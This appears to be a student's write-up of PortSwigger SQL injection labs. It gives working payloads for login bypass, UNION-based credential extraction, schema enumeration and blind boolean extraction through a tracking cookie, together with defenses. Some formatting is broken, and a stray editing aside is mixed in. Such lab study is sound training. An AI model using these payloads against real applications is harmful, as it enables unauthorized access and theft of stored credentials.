# PortSwigger SQL Injection Writeups
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** April 2026

---

## Lab 1 — SQL Injection in WHERE Clause (Hidden Data)
**Method:** Modified category filter in URL
**Payload:** `'+OR+1=1--`
**What I learned:** `'` breaks out of string, `OR 1=1` makes condition always true, `--` comments out the rest — reveals all hidden/unreleased data

---

## Lab 2 — SQL Injection Login Bypass
**Method:** SQLi in username field on login page
**Payload:** `administrator'--`
**What I learned:** `'--` comments out the password check entirely — authentication bypassed with no password needed

---

## Lab 3 — UNION Attack, Determining Column Count
**Method:** Added NULLs to UNION SELECT until no error
**Payload:** `' UNION SELECT NULL,NULL,NULL--`
**Result:** 3 columns returned by original query
**What I learned:** UNION requires matching column counts — use NULL (compatible with any type) and increment until page loads without error

---

## 🔍 Why This Vulnerability Exists

SQL Injection occurs when user-controlled input is directly inserted into a SQL query without proper validation or parameterization.

Example backend query:

```sql
SELECT * FROM users WHERE username = 'input' AND password = 'input';

If an attacker inputs:

' OR 1=1--

The query becomes:

SELECT * FROM users WHERE username = '' OR 1=1--' AND password = '';
OR 1=1 always evaluates to TRUE
-- comments out the rest of the query

This allows the attacker to bypass authentication and gain unauthorized access.    

 How to Prevent It
Use Prepared Statements (Parameterized Queries)
→ Ensures input is treated as data, not code
Avoid building queries using string concatenation
Use ORM frameworks (e.g., Django ORM, SQLAlchemy)
Apply input validation (but NOT as the only defense)
📌 Key Takeaway

SQL Injection is not just about payloads — it’s about understanding how user input interacts with backend database queries.


---

# 🧠 What this upgrade does

Before:
- “Used payload X”

After:
- Shows:
  - Backend understanding ✅  
  - Attacker mindset ✅  
  - Defense awareness ✅  
```md
## 🧠 Real-World Impact
SQL Injection can lead to full database compromise, data leakage, and in some cases remote code execution depending on database permissions.
```
## Lab: SQL Injection UNION Attack — Finding Column with Text
**Technique:** ORDER BY to find column count, UNION SELECT to find string column
**Key payload:** `'+UNION+SELECT+NULL,'DI0tMU',NULL--+-`
**What I learned:** Column 2 accepted strings — tested by moving value across positions

---

## Lab: SQL Injection UNION Attack — Retrieving Data from Other Tables
**Technique:** UNION SELECT to extract credentials from users table
**Key payload:** `'+UNION+SELECT+username,password+FROM+users--+-`
**What I learned:** Direct table extraction — retrieved all credentials in one query

---

## Lab: SQL Injection UNION Attack — Retrieving Multiple Values in Single Column
**Technique:** String concatenation using ||
**Key payload:** `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--+-`
**What I learned:** When only one column accepts strings, concatenate multiple values

---

## Lab: Database Version Detection — MySQL
**Technique:** @@version variable
**Key payload:** `'+UNION+SELECT+@@version,NULL#`
**What I learned:** MySQL uses # for comments and @@version for version detection

---

## Lab: Database Enumeration — Non-Oracle
**Technique:** information_schema enumeration
**Key payloads:**
- Tables: `'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+-`
- Columns: `'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name+LIKE+'users_ddzebl'--+-`
- Data: `'+UNION+SELECT+username_maxijo,password_adramj+FROM+users_ddzebl--+-`
**What I learned:** Full enumeration chain — tables → columns → data extraction


## Lab: Blind SQL Injection with Conditional Responses
**Difficulty:** Practitioner ✅ Solved

**Technique:** Boolean-based blind SQLi via TrackingId cookie

**The Oracle:**
- TRUE condition → page shows "Welcome back" (Content-Length: 11535)
- FALSE condition → no "Welcome back" (Content-Length: 11474)
- Difference = 61 bytes = our entire signal

**Step-by-step payloads:**

Confirm vulnerability:
TrackingId=ABC' AND '1'='1   → Welcome back ✅
TrackingId=ABC' AND '1'='2   → No Welcome back ❌

Confirm users table:
' AND (SELECT 'x' FROM users LIMIT 1)='x

Confirm administrator exists:
' AND (SELECT 'x' FROM users WHERE username='administrator')='x

Find password length:
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>19)='x  → ✅
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>20)='x  → ❌
Password length = 20 characters

Extract each character:
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

**Why I automated it:**
Burp Community Edition Intruder caused 504 timeouts due to rate limiting.
Built a custom Python script routing through Burp proxy (127.0.0.1:8080).
Script cracked all 20 characters successfully.

**Result:**
[*] Administrator password: jqq99hlmj2deoacrnjqj
Logged in as administrator → Lab Solved ✅

**What I learned:**
- Blind SQLi needs no visible output — just a behavioral difference
- Content-Length is a reliable oracle when "Welcome back" isn't rendering visually
- Python automation beats Burp Community Intruder for blind attacks
- Always route scripts through Burp proxy in lab environments

**Defense:**
- Parameterized queries eliminate blind SQLi entirely
- Never let application behavior differ based on SQL errors
- Rate limit cookie-based requests to prevent automated extraction

